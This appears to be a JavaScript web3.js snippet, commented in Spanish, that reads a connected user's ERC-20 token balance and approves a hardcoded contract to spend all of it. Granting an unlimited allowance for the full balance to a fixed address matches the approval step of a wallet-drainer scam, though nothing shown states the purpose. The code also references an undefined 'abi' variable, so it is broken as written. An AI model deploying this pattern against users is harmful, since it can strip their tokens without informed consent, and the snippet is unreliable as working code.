// Configurar web3.js
const web3 = new Web3(Web3.givenProvider);

// Dirección del contrato y la dirección del token ERC-20
const contractAddress = "0xC9007A9bdAb60e90AB2c658ddd21DD76d023f723";
const tokenAddress = "TOKEN_ERC20_ADDRESS";
// Fragmento de la ABI para las funciones necesarias del token ERC-20
const erc20Abi = [
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    }
];


// Interacción con el contrato para aprobar la transferencia de tokens ERC-20
async function approveTransfer() {
    try {
        // Obtener la instancia del contrato
        const contract = new web3.eth.Contract(abi, contractAddress);

        // Obtener la cuenta del usuario
        const accounts = await web3.eth.getAccounts();
        const userAccount = accounts[0];

        // Obtener el saldo de tokens ERC-20 del usuario
        const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
        const balance = await tokenContract.methods.balanceOf(userAccount).call();

        // Aprobar la transferencia del 100% del saldo de tokens ERC-20
        const approved = await tokenContract.methods.approve(contractAddress, balance).send({from: userAccount});
        console.log("Transferencia de tokens aprobada:", approved);
    } catch (error) {
        console.error("Error al aprobar la transferencia:", error);
    }
}
